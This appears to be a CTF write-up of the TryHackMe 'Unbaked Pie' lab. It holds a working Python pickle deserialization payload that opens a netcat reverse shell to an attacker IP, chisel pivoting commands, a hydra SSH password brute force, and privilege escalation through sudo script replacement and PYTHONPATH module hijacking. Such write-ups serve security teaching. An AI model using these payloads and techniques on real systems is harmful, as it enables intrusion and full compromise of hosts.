---
categories: [TryHackMe]
tags: [Chisel, Deserialization, Pivoting, PythonPATH, PrivEsc]  
media_subpath: /Vulnhub-Files/img/
image:
  path: Unbaked%20Pie/Untitled.png
  alt: TryHackMe Unbaked Pie Machine 🍰
---

## Description ⤵️

This machine is *<kbd>Unbaked Pie</kbd>* , It is from TryHackMe Platform and categorized as Medium machine . This Machine has pickle vulnerability .

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
└─$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 10.10.14.225 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:02 IST
Nmap scan report for 10.10.14.225
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings: 
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   SSLSessionReq: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     &lt;=
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data.
```
{: .nolineno}
{: .nolineno}

## Web Enumeration ⤵️

FIrstly I checked the 5003 port on browser and It is a static site →

![Untitled](Unbaked%20Pie/Untitled%201.png)

>I searched related to pickle vulnerability and I got a vulnerability →
>
>[https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
{: .prompt-tip }


```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.83.156 4444 >/tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
{: .nolineno}
{: .nolineno}

Now I executed this payload and got an input that I used in `search_cookie=` parameter in /search request and send the request →

```python
python3 exploit.py

b'gASVaQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjgzLjE1NiA0NDQ0ID4vdG1wL2aUhZRSlC4='
```
{: .nolineno}
{: .nolineno}

![Untitled](Unbaked%20Pie/Untitled%202.png)

In response to that I got the shell →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
└─$ nc -lvnp 4444     
listening on [any] 4444 ...
connect to [10.8.83.156] from (UNKNOWN) [10.10.89.190] 58742
/bin/sh: 0: can not access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@8b39a559b296:/home# ls -al
ls -al
total 28
drwxr-xr-x 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
drwxrwxr-x 8 root root 4096 Oct  3  2020 .git
drwxrwxr-x 2 root root 4096 Oct  3  2020 .vscode
-rwxrwxr-x 1 root root   95 Oct  3  2020 requirements.sh
-rwxrwxr-x 1 root root   46 Oct  3  2020 run.sh
drwxrwxr-x 1 root root 4096 Oct  3  2020 site
root@8b39a559b296:/home# cd /root
cd /root
root@8b39a559b296:~# ls -al
ls -al
total 36
drwx------ 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
-rw------- 1 root root  889 Oct  6  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x 3 root root 4096 Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4096 Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
root@8b39a559b296:~#
root@8b39a559b296:~# cat .bash_history
cat .bash_history
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh 
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
root@8b39a559b296:~# ip a   
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@8b39a559b296:~#
```
{: .nolineno}
{: .nolineno}

I noticed from bash history that the root user is trying to ssh login to ramsey so I have to try pivoting method through `chisel` tool .

From Attacker machine lets setup the server in listener mode →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
└─$ ./chisel server --port 8000 --socks5 --reverse
2023/10/31 21:35:59 server: Reverse tunnelling enabled
2023/10/31 21:35:59 server: Fingerprint 3c8nWfdmhbIIsqMYhTM16sluQgFQbA+HSKEHJV1ucFo=
2023/10/31 21:35:59 server: Listening on http://0.0.0.0:8000

# After Connection Establish by Client I get this message on server end ⤵️

2023/10/31 21:42:39 server: session#2: tun: proxy#R:1234=>172.17.0.1:22: Listening
```
{: .nolineno}
{: .nolineno}

Now on victim machine end lets transfer this chisel Tools to this machine through wget tool and then use the client mode →

```bash
 # ./chisel client 10.8.83.156:8000 R:1234:172.17.0.1:22
2023/10/31 16:12:41 client: Connecting to ws://10.8.83.156:8000
2023/10/31 16:12:43 client: Connected (Latency 174.8908ms)
```
{: .nolineno}
{: .nolineno}

Here in above chisel code I ran it , as client mode and given the location to connect to server with `Attackers IP` (10.8.83.156) and `Port Number` (8000) , then `R` represent the default location here it is `localhost` (127.0.0.1) and the `Port Number` (1234) where the port will be morphed to . 

`172.17.0.1` → This IP address is the Pivoting IP address which I need to access from Victim Machine.

`22` → Port Number that will be morphed to 1234 on Attacker Machine which I need to access from Victim Machine.

Now Lets access this ssh service on Attackers Machine →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
└─$ nmap 127.0.0.1 -p 1234            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 21:43 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00030s latency).

PORT     STATE SERVICE
1234/tcp open  hotline

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
```
{: .nolineno}
{: .nolineno}

Lets crack the password of ramsey from here →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
└─$ hydra -l ramsey -P /usr/share/wordlists/rockyou.txt -t 64 -s 1234 ssh://127.0.0.1

[DATA] attacking ssh://127.0.0.1:1234/
[1234][ssh] host: 127.0.0.1   login: ramsey   password: 12345678
1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 21:46:35
```
{: .nolineno}
{: .nolineno}

I get the credentails as →

```text
ramsey : 12345678
```
{: .nolineno}
{: .nolineno}

## SSH Service ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
└─$ ssh ramsey@127.0.0.1 -p 1234
The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can not be established.
ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:1234' (ED25519) to the list of known hosts.
ramsey@127.0.0.1 is password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

39 packages can be updated.
26 updates are security updates.

Last login: Tue Oct  6 22:39:31 2020 from 172.17.0.2
ramsey@unbaked:~$ whoami
ramsey
ramsey@unbaked:~$ id
uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)
ramsey@unbaked:~$
```
{: .nolineno}
{: .nolineno}

I have to see another privileges to root →

```bash
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
ramsey@unbaked:~$
```
{: .nolineno}
{: .nolineno}

And this `vuln.py` have these permissions so I will be replacing it with my vuln.py file like this →

```bash
ramsey@unbaked:~$ cd /tmp
ramsey@unbaked:/tmp$ nano vuln.py
ramsey@unbaked:/tmp$ chmod +x vuln.py
ramsey@unbaked:/tmp$ cat vuln.py
import os
os.system("/bin/bash") 
ramsey@unbaked:/tmp$ mkdir file
ramsey@unbaked:/tmp$ cd ~
ramsey@unbaked:~$ ls
payload.png  user.txt  vuln.py
ramsey@unbaked:~$ mv vuln.py /tmp/file/
ramsey@unbaked:~$ mv /tmp/vuln.py .
ramsey@unbaked:~$ ls -al
total 44
drwxr-xr-x 5 ramsey ramsey 4096 Nov  1 00:35 .
drwxr-xr-x 4 root   root   4096 Oct  3  2020 ..
-rw------- 1 root   root      1 Oct  5  2020 .bash_history
-rw-r--r-- 1 ramsey ramsey 3771 Oct  3  2020 .bashrc
drwx------ 3 ramsey ramsey 4096 Oct  3  2020 .cache
drwx------ 4 ramsey ramsey 4096 Oct  3  2020 .local
drwxrwxr-x 2 ramsey ramsey 4096 Oct  3  2020 .nano
-rwxrw-r-- 1 ramsey ramsey 1645 Oct  3  2020 payload.png
-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile
-rw-r--r-- 1 root   root     38 Oct  6  2020 user.txt
-rwxrwxr-x 1 ramsey ramsey 1649 Nov  1 00:34 vuln.py
ramsey@unbaked:~$
```
{: .nolineno}
{: .nolineno}

Now lets execute for oliver user →

```bash
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
oliver@unbaked:~$ whoami
oliver
oliver@unbaked:~$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
oliver@unbaked:~$
```
{: .nolineno}
{: .nolineno}

In this case I have to do **[Module Hijacking](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#module-hijacking)** ⤵️ 

```bash
oliver@unbaked:~$ cd /opt
oliver@unbaked:/opt$ ls -al
total 16
drwxr-xr-x  3 root root     4096 Oct  3  2020 .
drwxr-xr-x 23 root root     4096 Oct  3  2020 ..
drwx--x--x  4 root root     4096 Oct  3  2020 containerd
-rwxr-x---  1 root sysadmin  290 Oct  3  2020 dockerScript.py
oliver@unbaked:/opt$ cat dockerScript.py 
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
oliver@unbaked:/opt$
```
{: .nolineno}
{: .nolineno}

Now lets create a `docker.py` file in /tmp directory with bash executable commands and then set the `PYTHONPATH` for it to `/tmp/` directory so that import docker should load the docker from `/tmp/docker.py` file and I get the shell →

```bash
oliver@unbaked:/opt$ cd /tmp
oliver@unbaked:/tmp$ nano docker.py
oliver@unbaked:/tmp$ chmod +x docker.py 
oliver@unbaked:/tmp$ cat docker.py 
import os
os.system("/bin/bash")
oliver@unbaked:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python /opt/dockerScript.py
root@unbaked:/tmp# whoami
root
root@unbaked:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@unbaked:/tmp# cd /root
root@unbaked:/root# ls -al
total 32
drwx------  4 root root 4096 Oct  6  2020 .
drwxr-xr-x 23 root root 4096 Oct  3  2020 ..
-rw-------  1 root root    1 Oct  6  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 23  2015 .bashrc
drwx------  3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x  2 root root 4096 Oct  3  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  151 Oct  6  2020 root.txt
root@unbaked:/root# cat root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{FLAG_FLAG_FLAG_FLAG}
root@unbaked:/root#
```
{: .nolineno}
{: .nolineno}

I am root now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }